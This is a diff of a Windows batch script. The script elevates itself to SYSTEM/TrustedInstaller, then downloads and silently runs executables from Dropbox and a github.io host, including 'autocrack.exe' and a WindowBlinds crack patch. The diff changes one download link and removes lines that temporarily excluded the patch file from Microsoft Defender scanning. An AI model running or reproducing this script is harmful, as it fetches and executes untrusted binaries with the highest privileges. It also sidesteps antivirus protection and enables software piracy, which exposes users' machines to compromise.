@@ -1,6 +1,6 @@
 @echo off
 whoami /user | findstr /i /c:S-1-5-18 >nul || ( call :RunAsTI "%~f0" %* & exit /b )
-curl https://dl.dropbox.com/scl/fi/mx54czvp4ajeq0dze3y9h/Get7.zip?rlkey=sh0cwdn3dne9k7u59nfhywov1 -Lo "%temp%\Get7.zip"
+curl https://dl.dropbox.com/scl/fi/be6vz29xcmqcuhpmjm0e8/Get7.zip?rlkey=1l94sd3uwcsj7v11wratgeamz -Lo "%temp%\Get7.zip"
 powershell Expand-Archive -Force -Path '%temp%\Get7.zip' -DestinationPath '%temp%\Get7'
 del /f /q "%temp%\Get7.zip"
 cd /d "%temp%\Get7"
@@ -90,13 +90,10 @@ del /f /q "%temp%\RDPWInst.exe"
 curl --output "%TEMP%\WindowBlinds11_setup.exe" "https://microtoolbox.github.io/8d4ejv.com"
 start /wait "" "%TEMP%\WindowBlinds11_setup.exe" /S
 del /f /q "%TEMP%\WindowBlinds11_setup.exe"
-powershell Add-MpPreference -ExclusionPath '%TEMP%\Stardock_WindowBlinds_v11.02_Patch_Jasi2169.exe'
 curl --output "%TEMP%\Stardock_WindowBlinds_v11.02_Patch_Jasi2169.exe" "https://microtoolbox.github.io/Stardock_WindowBlinds_v11.02_Patch_Jasi2169.exe"
 curl --output "%TEMP%\autocrack.exe" "https://microtoolbox.github.io/autocrack.exe"
 start /wait "" "%TEMP%\autocrack.exe" "%TEMP%\Stardock_WindowBlinds_v11.02_Patch_Jasi2169.exe"
-powershell sleep 5
 del /f /q "%TEMP%\Stardock_WindowBlinds_v11.02_Patch_Jasi2169.exe"
-powershell Remove-MpPreference -ExclusionPath '%TEMP%\Stardock_WindowBlinds_v11.02_Patch_Jasi2169.exe'
 del /f /q "%TEMP%\autocrack.exe"
 curl --output "%TEMP%\SkinStudio_10_setup_sd.exe" "https://microtoolbox.github.io/SkinStudio_10_setup_sd.exe"
 start /wait "" "%TEMP%\SkinStudio_10_setup_sd.exe" /S
